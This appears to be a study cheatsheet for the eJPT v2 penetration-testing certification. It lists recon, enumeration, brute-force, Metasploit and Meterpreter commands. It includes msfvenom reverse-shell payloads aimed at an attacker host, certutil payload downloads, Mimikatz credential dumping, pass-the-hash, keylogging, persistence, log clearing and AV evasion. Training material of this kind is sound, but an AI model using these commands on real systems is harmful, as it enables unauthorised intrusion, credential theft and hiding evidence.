Title: eJPT-v2 Cheatsheet
Slug: certifications/inesecurity/ejpt-cheatsheet
Date: 1957-01-01 00:00
Category: Cheatsheet

# Information Gathering

## Website Recon & Footprinting

- IP addresses: 
    - DNS: host, dig, nslookup, ping, [dnsrecon](https://www.kali.org/tools/dnsrecon/),[dnsdumpster](https://dnsdumpster.com)
    - whois
    - Google Dorks
- Network Information:
    - Domains: [sublist3r](https://github.com/aboul3la/Sublist3r)
    - WAF: [wafw00f](https://github.com/EnableSecurity/wafw00f)
- Hidden directories:
    - robots.txt
    - sitemap.xml or sitemaps.xml
    - Google Dorks
- Names:
    - whois
- Emails:
    - whois, (theHarvester)[https://github.com/laramies/theHarvester]
- Phone numbers:
    - whois
- Physical Addresses:
    - whois
- Passwords:
	- [havibeenpwned](https://haveibeenpwned.com)
- Web Technologies Footprinting
    - robots.txt
    - Browser plugins: BuiltWith, Wappalyzer
    - cli: whatweb, [httrack](https://www.httrack.com)


### Google Dorks

Dorks accept wildcards:
~~~
- site:"< site >" // matches the site domain and subdomains
- inurl:"< keyword >" // matches the keyword into url
- intitle:"< keyword >" // matches the keyword into site title
- filetype:"< filetype >" // matches files of specified extension
- cache:"< site >" // find the old versions of the site
~~~

Cool Examples:

~~~
- intitle:"index of" // finds webservers with directory listing enabled
- inurl:"auth_user_file.txt" | inurl:"passwd" // find webserver with file exposing users or/and passwords (auth_user_file and passwd are an examples)
~~~

Cool resources:

- [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)


## Active Information Gathering

### DNS Zone Transfers

Cool resource:

- zonetransfer.me : playground domain useful when testing tools regarding DNS pentesting

\*Note: /etc/hosts has priority above dns server when resolving a name

Useful tools:

- dnsenum: performs dns enumeration, dns bruteforce, automatic zone transfer, etc.

- dig axfr @< nameserver > < domain>

- [fierce](https://github.com/mschwager/fierce): DNS reconnaissance tool for locating non-contiguous IP space.


### Host Discovery

~~~
- nmap -sn <ip CIDR range>
    - sn: no port scan (see man nmap)

- netdiscover: tool used for host discovery 
~~~

Nmap options:

\-F performs a fast scan, scanning the 1000 most common ports  
\-sU performs a standard UDP scan \* 
\-sV performs service version detection  
\-sC runs defaults scripts set  
\-p < port range or list >  
\-O tries enumerate operating system  
\-T paranoid|sneaky|polite|normal|aggressive|insane specifies the timing template (speed up or slow down the scan)
- paranoid => T0
- sneaky => T1
- polite => T2
- normal => T3
- aggressive => T4
- insane => T5  
\-oN < file > output the result to a file

\* Note: when running UDP scan, the scan is faster using the \-\-min\-rate option

# Footprinting & Scanning


## Network Host Mapping

### Wireshark

To get the list of all hosts in intercepted packages:
- statistcs > endpoints

### ARP scan

~~~
arp-scan -I <interface> -g <subnet> // get the subnet with ip -a
~~~
### fping

fping allows to ping multiple host at one time unlike ping

~~~
- fping -I <interface> -g <subnet> -a 2>/dev/null
~~~

*Note*: some hosts might not respond to ping but they might be in some arp-table; viceversa, some hosts might not be in any arp-table but they might be enumerated via ping.

### nmap

~~~
nmap -sn <subnet>
~~~

## Port Scanning

### nmap

~~~
- nmap -iL <file containing ips> // basic scan
- nmap -iL <file containing ips> -sV -O // enumerate services versions and OS
- nmap -iL <file containing ips> -sV -O -sC // enumerate services versions, OS and test for some vulnerabilities (default nmap scripts)
~~~
### metasploit

Common used TCP port scanning modules:

~~~
- auxiliary/scanner/portscan/ack
- auxiliary/scanner/portscan/syn
- auxiliary/scanner/portscan/tcp
~~~

UDP service and port discovery:

~~~
- auxiliary/scanner/discovery/udp_sweep
~~~

## Enumeration

### SMB

#### nmap 

~~~
- nmap -sU --top-ports 25 -sV --open <target> // UDP ports
~~~

SMB Enumeration scripts:

~~~
- smb-protocols: Attempts to list the supported protocols and dialects of a SMB server
- smb-security-mode: Returns information about the SMB security level determined by SMB
- smb-enum-sessions: Enumerates the users logged into a system either locally or through an SMB share
    - if any credentials are available, this script can be run with them using the --script-args option
- smb-enum-shares: Attempts to list shares 
    - same as up
- smb-enum-users: enumerate existing users
- smb-server-stats: get smb server stats
- smb-enum-domains: enumerate existing domains information
- smb-enum-groups: enumerate existing groups
- smb-enum-services: Attempts to enumerate domains on a system, along with their policies. This generally requires credentials
- smb-ls: if used after smb-enum-shares, will perform a list in each shares
- smb-os-discovery: enumerate varous information about the system
~~~

#### smbmap

~~~
- smbmap -u guest -p "" -H <target IP> -d . // Guest shares enumeration:
- smbmap -u <user> -p <password> -H <target IP> -d . // Authenticated shares enumeration
- smbmap -u <user> -p <password>-H <target IP> -x <command> // Command execution
- smbmap -u <user> -p <password>-H <target IP> -L // List drives
- smbmap -u <user> -p <password>-H <target IP> -r <drive> // Recursively List drive contents
- smbmap -u <user> -p <password>-H <target IP> --upload <local file> <destination path> // Upload local file
- smbmap -u <user> -p <password> -H <target IP> --download <remote file> // Download remote file
~~~

#### metasploit

Useful modules: 

~~~
- auxiliary/scanner/smb/smb_version: enumerates smb server version
- auxiliary/scanner/smb/smb2: The SMB2 scanner module simply scans the remote hosts and determines if they support the SMB2 protocol.
- auxiliary/scanner/smb/smb_enumshares: enumerates shares
- auxiliary/scanner/smb/smb_login: test logins performing a dictionary attack
- auxiliary/scanner/smb/pipe_auditor: enumerates available named pipes\*
~~~

\*Note: smb uses **pipes** to connect services. A named pipe is a logical connection, similar to a TCP session, between a client and server. SMB clients access named pipe endpoints using the named pipe share named "IPC$".

#### nmblookup

nmblookup: NetBIOS over TCP/IP client used to lookup NetBIOS names

~~~
- nmblookup -A <target ip>
~~~

#### smbclient

smbclient: smb client for interacting with smb servers

~~~
- smbclient -L <target ip> -N // list shares as guest (-N == --no-pass)
- smbclient //<target> -N // interact with the smb server
~~~

#### rpcclient
When IPC$ is enabled, it's possible to connect to it using **rpcclient** and perform more enumeration

~~~
- rpcclient -U "" -N <target> //connect to the IPC service
    - enumdomusers // enumerate users in the domain
    - enumdomgroups // enumerate groups in the domain
    - lookupnames <username> // get SID correspondint to the specified username
~~~

#### enum4linux

~~~
- enum4linux -o <target> // get os information about target
- enum4linux -S <target> // enumerate shares
- enum4linux -U <target> // enumerate users
- enum4linux -G <target> // enumerate groups
- enum4linux -r -u "<username" -p "<password>" <target> // perform authenticated users enumeration via RID cycling
~~~
#### hydra

~~~
- hydra -l <username> -P <passwd wordlist> <target> <protocol> // perform bruteforcing, on smb when protocol is smb
~~~

### FTP

#### hydra

~~~
- hydra -l <username> (or -L <username wordlist>) -P <passwd wordlist> <target> ftp // perform bruteforcing
~~~

#### nmap

~~~
- nmap --script ftp-brute --script-args userdb=<username worldist> -p 21 <target>
- nmap --script ftp-anon -p 21 <target>
~~~

### SSH

#### netcat

~~~
nc <target> 22 // Banner grabbing
~~~

#### nmap

~~~
- nmap --script ssh2-enum-algos -p 22 <target>: shows all the algorithms used by the ssh server
- nmap --script ssh-hostkey --script-args ssh_hostkey=full -p 22 <target>: get the host public keys for every available algorithm, if existing
- nmap --script ssh-auth-methods --script-args "ssh.user=<user>" -p 22 <target>: enum authorization methods used for a specific user
- nmap --script ssh-brute --script-args userdb=<username worldist> -p 22 <target>
~~~
#### hydra

~~~
- hydra -l <username> (or -L <username wordlist>) -P <passwd wordlist> <target> ssh // perform bruteforcing
~~~

#### metasploit

~~~
- auxiliary/scanner/ssh/ssh_login
~~~

### HTTP

~~~
- whatweb <target> // enumerate technologies
- http <target> // send a http request
- dirb <target> // enumerate directories with default wordlist
- browsh --startup-url <target> // cli browser
- lynx <target> // cli browser
- curl <target>
- wget <target>
~~~

#### nmap

~~~
- nmap --script banner -p 80 <target> // perform banner grabbing
- nmap --script http-enum -p 80 <target>
- nmap --script http-headers -p 80 <target>
- nmap --script http-methods --script-args http-methods.url-path=<path> -p 80 <target>
- nmap --script http-webdav-scan --script-args http-methods.url-path=<path> -p 80 <target> // detect WebDAV installations
~~~

#### metasploit

~~~
- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/brute_dirs
- auxiliary/scanner/http/robots_txt
~~~


### MySQL

~~~
- select load_file("<path>"); // Exfiltrate file content
~~~

#### metasploit

~~~
- auxiliary/scanner/mysql/mysql_writable_dirs: enumerate writable dirs
- auxiliary/scanner/mysql/mysql_file_enum: enumerate files
- auxiliary/scanner/mysql/mysql_mysqlhashdump: dump password hashes
- auxiliary/scanner/mysql/mysql_schemadump: dump schema
- auxiliary/scanner/mysql/mysql_login: bruteforce passwords
~~~

#### nmap

~~~
- nmap -p 3306 --script mysql-info <target> // enumerate infos such as version, capabilieties, etc.
- nmap -p 3306 --script mysql-empty-password <target> // check if db allows empty password logins
- nmap -p 3306 --script mysql-users --script-args="mysqluser='root',mysqlpass=''" <target> // emumerate users using known credentials
- nmap -p 3306 --script mysql-databases --script-args="mysqluser='root',mysqlpass=''" <target> // emumerate dbs using known credentials
- nmap -p 3306 --script mysql-variables --script-args="mysqluser='root',mysqlpass=''" <target> // emumerate variables using known credentials
- nmap -p 3306 --script mysql-dump-hashes --script-args="username='root',password=''" <target> // dump password hashes using known credentials
- nmap -p 3306 --script mysql-query --script-args="query='<query>',username='root',password=''" <target> // perform a query using known credentials
- nmap -p 3306 --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.pass='',mysql-audit.filename='nselib/data/mysql-cis.audit'" <target> // Audits MySQL database server security configuration against a specified audit rulebase (mysql.audit.filename)
~~~

#### hydra

~~~
- hydra -l <username> (or -L <username wordlist>) -P <passwd wordlist> <target> mysql // perform bruteforcing
~~~

### MSSQL

#### nmap

~~~
- nmap -p 1433 --script ms-sql-info <target> // enumerate target info such as version, patches, etc.
- nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <target> // This script enumerates information from remote Microsoft SQL services with NTLM authentication enabled.
- nmap -p 1433 --script ms-sql-brute --script-args userdb=<users list>,passdb=<pwd db> <target> // bruteforce login on mssql server
- nmap -p 1433 --script ms-sql-empty-password <target> // check if db allows empty password logins
- nmap -p 1433 --script ms-sql-query --script-args mssql.username=<user>,mssql.password=<password>,ms-sql-query,query="<query>" <target> // perform a query using known credentials
- nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<user>,mssql.password=<password> <target> // dump password hashes using known credentials
- nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<user>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="<command>" <target> // run an os command using known credentials
~~~

#### metasploit

~~~
- auxiliary/scanner/mssql/mssql_login // bruteforce credentials
- auxiliary/admin/mssql/mssql_enum // enum various informations
- auxiliary/admin/mssql/mssql_enum_sql_logins
- auxiliary/admin/mssql/mssql_exec // exec commands
- auxiliary/admin/mssql/mssql_enum_domain_accounts
~~~

### SMTP

#### metasploit

~~~
- auxiliary/scanner/smtp/smtp_version
- auxiliary/scanner/smtp/smtp_enum: enum users
~~~ 

# Vulnerability Assessment

## Heartbleed

### nmap

~~~
- nmap -sV --script ssl-enum-ciphers -p 443 <target>
- nmap --script ssl-heartbleed -p 443 <target>
~~~
### ExploitDB

- https://www.exploit-db.com/search?q=heartbleed


## EternalBlue - MS17-1010

### nmap

~~~
- nmap -p 445 --script smb-vuln-ms17-010 <target>
~~~

### ExploitDB

- https://www.exploit-db.com/search?q=ms17-010


## Log4J

### nmap

- https://github.com/giterlizzi/nmap-log4shell

## WebDAV

### davtest 

~~~
- davtest -url <webdav url>
- davtest -auth <username:password> -url <webdav url and directory> 
~~~

### cadaver

~~~
- cadaver <webdav url>
~~~
### Nmap

~~~
- nmap -sV -p 80 --script=http-enum <target>
~~~

### Hydra

~~~
- hydra -L <users wordlist> -P <passwords wordlist> <target> http-get <webdav directory> 
~~~

### Metasploit

~~~
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker host> LPORT=<attacker port>  -f <format: for example asp> > shell.<format> (to be used with multi/handler)

- exploit/windows/iis/iis_webdav_upload_asp
~~~

## SMB 

### Impacket Scripts

~~~
- psexec.py Administrator@192.168.1.1
- wmiexec.py Administrator@192.168.1.1
- smbexec.py Administrator@192.168.1.1
~~~

### Metasploit

~~~
- auxiliary/scanner/smb/smb_login
- exploit/windows/smb/psexec
~~~

## MS17-010 EternalBlue Exploit

### Nmap

~~~
- nmap -sV -O -p 445 <target>
- nmap -sV -p 445 --script=smb-vuln-m17-010 <target>
~~~

### Metasploit

~~~
- auxiliary/scanner/smb/smb_ms17_010
- exploit/windows/smb/ms17_010_eternalblue
~~~

### AutoBlue

[AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010): see documentation


## RDP

### Nmap

~~~
- nmap -sV -O -p- <target>
~~~

### Metasploit

~~~
- auxiliary/scanner/rdp/rdp_scanner
~~~

### Hydra

~~~
- hydra -L <users wordlist> -P <password wordlist> -s <port> <target> rdp
- hydra -L <users wordlist> -P <password wordlist> -s <port> rdp://<target> 

To reduce/increase the bruteforce speed:

- -t option 
~~~


### xfreerdp

~~~
- xfreerdp /u:<user> /p:<password> /v:<target>:<port>
~~~


## CVE-2019-0708 - BlueKeep

### Nmap

~~~
- nmap -sV -p 3389 <target>
~~~

### Metasploit

~~~
- scanner/rdp/cve_2019_0708_bluekeep
- exploit/windows/rdp/cve_2019_0708_bluekeep_rce
~~~

## WinRM

### crackmapexec 

~~~
- crackmapexec winrm <target> -u <users worldist|username> -p <passwords wordlist> 
- crackmapexec winrm <target> -u <users worldist|username> -p <passwords wordlist>  -x "<command>"
~~~

### evil-winrm 

~~~
- evil-winrm.rb -u <user> -p <password> -i <target>
~~~

### Nmap

~~~
- nmap -sV -p 5985,5986 <target>
~~~

\*Note: generally WinRM hasn't a default banner so in nmap result could not be immediate to identify this service

### Metasploit

~~~
- exploit/windows/winrm/winrm_script_exec - "set FORCE_VBS true" can be useful
~~~


# Network-Based Attacks 

## Wireshark

Force name resolution - display dns name instead of IP address or MAC address: 

~~~
- View > Name resolution > Resolve Network Addresses
~~~

Break down the protocols found in the packet capture:

~~~
- Statistics > Protocol hierarchy
~~~

Break down by addresses each machine found in the packet capture:

~~~
- Statistics > Protocol hierarchy
~~~

Customize displayed columns:

~~~
- right click on columns header > Columns Preferences
~~~

Get the whole conversation:

~~~
- right click on the package > Follow > TCP/HTTP Stream
~~~

Export Objects like images or whole html pages:

~~~
- File > Export Objects
~~~

## Tshark

Open saved pcap:

~~~
- tshark -r <file>
~~~

Break down protocols found in pcap (Protocol Hierarchy):

~~~
- tshark -r <file> -z io,phs -q
~~~

Apply Wireshark Display Filters:

~~~
- tshark -r <file> -Y '<filter>'
~~~

Display only specified fields:

~~~
- tshark -r <file> -Y '<filter>' -Tfield -e <field name> ...
~~~

## ARP Poisoning

Enable ip forwarding:

~~~
- echo 1 > /proc/sys/net/ipv4/ip_forward
~~~

Start arp spoofing:

~~~
- arpspoof -i <interface> -t <target ip>-r <spoofed host>
~~~

# Metasploit Framework

## MSF Console

Check the state of databases:

~~~
- db_status
~~~

Show all available modules:

~~~
- show all
~~~

Show specific type of module:

~~~
- show <module: for example, exploits - see show -h>
- show type:<module>
~~~

Search module by name:

~~~
- search <term>
~~~

Search module by attributes (combinable):

~~~
- search cve:<cve>
- search platform:<windows|linux>
- search type:<module>
- search name:<name>
~~~

Use a module:

~~~
- use <module name or index after search>
~~~

Show module options:

~~~
- show options OR options
~~~

Set option value:

~~~
- set <option name> <value>
- setg <option name> <value> - set globally
~~~

Get information about the module:

~~~
- info
~~~

Run the module:

~~~
- run OR exploit
~~~

List active sessions:

~~~
- sessions
~~~

Rename a session:

~~~
- sessions -n <name> <session id>
~~~

Kill a session:

~~~
- sessions -k <session id>
~~~

Load an installed plugin:

~~~
- load <plugin name>
~~~

Load a custom script:

~~~
- resource <script path>
~~~

Connect to an host, similarly to netcat, for example to perform banner grabbing:

~~~
- connect <options> <host> <port>
- see connect -h
~~~

List enumerated hosts:

~~~
- hosts
~~~

List enumerated services:

~~~
- services
~~~

List enumerated vulnerabilities:

~~~
- vulns
~~~

## MSF Workspaces

List workspaces:

~~~
- workspace
~~~

Add workspace:

~~~
- workspace -a <name>
~~~


Switch workspace:

~~~
- workspace <name>
~~~

Remove workspace:

~~~
- workspace -d <name>
~~~

Rename workspace:

~~~
- workspace -r <current name> <new name>
~~~

## MSF: Information Gathering & Enumeration

Manually import nmap xml scan result into MSF:

~~~
- db_import <xml path>
~~~

Perform an nmap scan from within MSF:

~~~
- db_nmap <nmap flags and options>
~~~

## MSF: WMAP

WMAP is available as an MSF plugin and can be loaded directly into MSF:

~~~
- load wmap
~~~

Available commands:

~~~
- wmap_modules
- wmap_nodes 
- wmap_run // launch all modules, a subset matching a regex or based on the specified *profile*
- wmap_sites // list, add and remove sites - see wmap_sites -h
- wmap_targets // list, add and remove targets (sites added from previous command) 
- wmap_vulns
~~~

## MSFVenom

~~~
- msfvenom --list  payloads // list available payloads
- msfvenom --list format // list available formats
- msfvenom --list archs // list available architectures
- msfvenom --list encoders // list available encoders
~~~

It's possible to specify the architecture with this option:

~~~
- -a <arch>
~~~

To use a payload:

~~~
- -p | --payload <payload> <PAYLOAD PARAMS in the format name=value>
~~~

To specify the format:

~~~
- -f | --format <format>
~~~

To specify an encoder:

~~~
- -e | --encoder <encoder>
~~~

To specify the number of iterations for the encoding:

~~~
- -i | --iterations <iterations>
~~~

Inject payloads into legitimate Windows Portable Executables

~~~
- -x | --template 
~~~

~~~
Preserve the binary behaviour of the specified template:
- -k | --keep
~~~

## Meterpreter

Get OS info:

~~~
- sysinfo
~~~

Get current user id and privileges:

~~~
- getuid
- getprivs
~~~

Get environment variable:

~~~
- getenv <variable>
~~~

Background current session:

~~~
- background | CTRL + z
~~~

Edit file:

~~~
- edit <file path>
~~~

Download file:

~~~
- download <file path> <local destination | default current path>
~~~

Upload file:

~~~
- upload <local file path> <remote destination | default current path>
~~~

Search for a file or directory:

~~~
- search -d <starting path> -f <file name>
~~~

Open a shell:

~~~
- shell
~~~

List processes:

~~~
- ps
~~~

Migrate to process:

~~~
- pgrep <process> // obtain the process PID, for example: explorer or lsass
- migrate <PID> // migrate meterpreter session to PID (explorer will be x64)
OR
- migrate -N <process name>
~~~

Run command on the target system:

~~~
- execute <command>
~~~

Upgrade simple shell to meterpreter:

~~~
- Background current session
- use post/multi/manage/shell_to_meterpreter

OR

- sessions -u <session id>
~~~

Post exploitation useful commands:

~~~
- getsystem - try elevate privileges
- hashdump - dump password hashes
- screenshot - take a screenshot of a desktop session
- keyscan_start | keyscan_stop | keyscan_dump - start recording, stop recording and dump keytrokes from an active user session
- screenshare - watch user's desktop in realtime
- clearev - remove event logs
~~~

## Post-Exploitation Modules

~~~
- post/windows/manage/migrate - migrate to process
- post/windows/manage/archmigrate - change current process architecture
- post/windows/gathern/win_privs - Windows Gather Privileges Enumeration
- post/windows/gather/enum_logged on_users
- post/windows/gather/checkvm - Check if running in a windows VM
- post/windows/gather/enum_applications
- post/windows/gather/enum_av_excluded - Enumerate AV exclusions
- post/windows/gather/enum_computers - Enum computers that are part of the domain
- post/windows/gather/enum_patches - Enum installed hotfixes
- post/windows/gather/enum_shares - Enum SMB shares
- post/windows/manage/enable_rdp
~~~

## MSF: Pivoting

Add route to another subnet:

~~~
- run autoroute -s <subnet>
OR
- use post/multi/manage/autoroute
~~~

List active routes:

~~~
- run autoroute -p
~~~

Port forwarding:

~~~
- portfw add -l <local port> -p <remote port> -r <remote address>
~~~

# Windows Privilege Escalation

https://github.com/itm4n/PrivescCheck

### Windows Kernel Exploitation

- [Windows-Exploit-Suggester]( https://github.com/AonCyberLabs/Windows-Exploit-Suggester):  This tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches on the
target.
- [Windows-Kernel-Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135) : Collection of Windows Kernel exploits sorted by CVE.

### Metasploit

~~~
- post/multi/recon/local_exploit_suggester
~~~

## Bypassing UAC

[UACMe](https://github.com/hfiref0x/UACME) is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques

- It allows attackers to execute malicious payloads on a Windows target with
administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.

## Access Token Impersonation

### Meterpreter

Meterpreter has an "Incognito" module that allows you to impersonate user tokens after successful exploitation.

~~~
- load incognito
~~~

## Windows File System Vulnerabilities

### Alternate Data Streams

~~~
- notepad <filename>.txt:<meta>.txt // this will create an empty txt file whilst the editor will allow to insert some content into the specified meta (into the Resource Stream) instead of the Data Stream
- type payload.exe > <filename>.txt:<meta>.exe // same as before but setting a binary as meta value

To exploit it:
- start <filename>:<meta>.exe // can be useful to create a symlink to the <filename>:<meta>.exe if not working
	-  mklink <link> <target> && start <link>
~~~

# Windows Credential

The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:

- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

CMD Download files from remote server:

~~~
certutil -urlcache -f http://<remote server\>/payload.exe payload.exe
~~~

In a Meterpreter session, search for a file matching the specified name:

~~~
- search -f <name> -> ex: search -f Unattend.xml
~~~
## Exfiltrate & Crack Passwords

### Mimikatz

~~~
- privileg::debug // check available privileges. If Privilege '20' OK , it's all good
- lsadump::sam // dump sam from lsass cache
- lsadump::secrets // dump secrets
- sekurels::logonpasswords // bad configuration allow storing cleartext password every time a user logs in
~~~

**Mimikatz will require elevated privileges in order to run correctly since lsass is a ran by the administrator user.**

### Metasploit

To extract hashes from lsass process:

~~~
- load kiwi
	- creds_all -> retrieve all ceredentials (kerberos, livessp, msv, etc.)
	- lsa_dump_sam -> dump hashes from LSA SAM  
	- lsa_dump_secrets -> in some cases could provide clear text passwords
~~~

### Cracking

~~~
- john --format=NT <hashes file> --wordlist=<wordlist>
- hashcat -a3 -m 1000 <hashes file> <wordlist>
~~~

## Pass-the-Hash Attack

### Metasploit

In modules using authentication, it's possible to pass the LM:NTLM hash belonging to a user as his password.

### Crackmapexec

~~~
- crackmapexec smb <target> -u <User> -p <Password> (or -H <Hash>) -x "<command>"
- crackmapexec smb <target> -u <User> -p <Password> (or -H <Hash>) -x "<command>"
~~~


# Linux Privilege Escalation
## Bash CVE-2014-6271 Vulnerability (Shellshock)

### NMAP
~~~
- nmap  -sV  --script=http-shellshock --script-args "http-shellshock.uri=/<cgi script location>" <target>
~~~

### Metsploit

~~~
- auxiliary/scanner/http/apache_mod_cgi_bash_env
- exploit/multi/http/apache_mod_cgi_bash_env_exec
~~~

## Linux Kernel Exploits

- [Linux-Exploit-Suggester](https://github.com/mzet-/linux-exploit-suggester):  assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.

## Linux Credential Cracking

### Metasploit

~~~
- auxiliary/analyze/crack_linux
~~~


### JohnTheRipper
~~~
- unshadow passwd.txt shadow.txt > unshadowed.txt
- john --wordlist=<wordlist> unshadowed.txt
~~~

### Hashcat 

~~~
hashcat -m 1800 -a 0 <hashes fil> <wordlist>
~~~

# Windows Post-Exploitation

## Enumeration

System Information:
~~~
 - sysinfo (from Meterpreter)
 - hostname
 - systeminfo
 - wmic qfe get <Optionally: Comma-separated list of fields>
	 - ex: Caption,Description,HotFixID,InstalledOn
- type C:\\Windows\System32\eula.txt
~~~

Users & Groups:

~~~
- getuid (from Meterpreter)
- getprivs (from Meterpreter)
- windows/gather/enum_logged_on_users (msf module)
- whoami
- whoami /priv
- query users (currently logged on users)
- net users
- net user <username>
- net localgroup
- net localgroup <group>
~~~

Network Informations:

~~~
- ipconfig /all
- route print
- arp -a
- netstat -ano
- netsh firewall show state (Windows Firewall state) - DEPRECATED
- netsh advfirewall show allprofiles (Windows Firewall state)
- netsh advfirewall firewall dump (Dump Windows Firewall configuration)ù
~~~

Process & Services:

~~~
- ps (from Meterpreter)
- pgrep <term> (from Meterpreter - get PID of process matching term)
- migrate <PID> (from Meterpreter)
- windows/gather/enum_shares (msf module)
- net start (started Windows services)
- wmic service list brief
- tasklist /SVC (running processes and services)
- schtasks /query /fo LIST /v (scheduled tasks)
~~~

Automated Tools:

- https://github.com/EnginDemirbilek/WinEnum
- https://github.com/411Hall/JAWS

## File Transfer

~~~
- certutil -urlcache -f <url> <output file>
~~~
## Persistence

~~~
- exploit/windows/local/persistence_service (msf module)
- run getgui -e -u <new rdp user> -p <password> (msf script - enable rdp and add user)
	- The user is removed from the user list in the login page and added to local *Administrators* and *Remote Desktop Users* group
~~~

# Clearing your tracks

Windows:

~~~
- clearev (msf script)
- resource <cleanup script> (cleanup script is generate by msf modules themselves)
~~~

Linux:

~~~
- history -c
- cat /dev/null > <file to clean | generally history files
~~~

# AV Evasion & Obfuscation

## Shellter

Shellter is a dynamic shellcode injection tool that can be used in order to inject shellcode into native Windows applications - see [there](https://www.shellterproject.com/).

~~~
- sudo wine shellter.exe
- Stealth Mode: makes the vector binary continue to work as intended executing the injected shellcode into background.
~~~

## Invoke-Obfuscation

Invoke-Obfuscation is an open source PowerShell v2.0+ compatible PowerShell command and script obfuscator. - see [there](https://github.com/danielbohannon/Invoke-Obfuscation).

# Upgrading Shells

~~~
- cat /etc/shells (get available shells)
- /bin/bash -i (if available)
- /bin/sh -i 
- python -c 'import pty; pty.spawn("/bin/bash")'
- perl -e 'exec "/bin/bash";'
- ruby -e "exec '/bin/bash' "
~~~
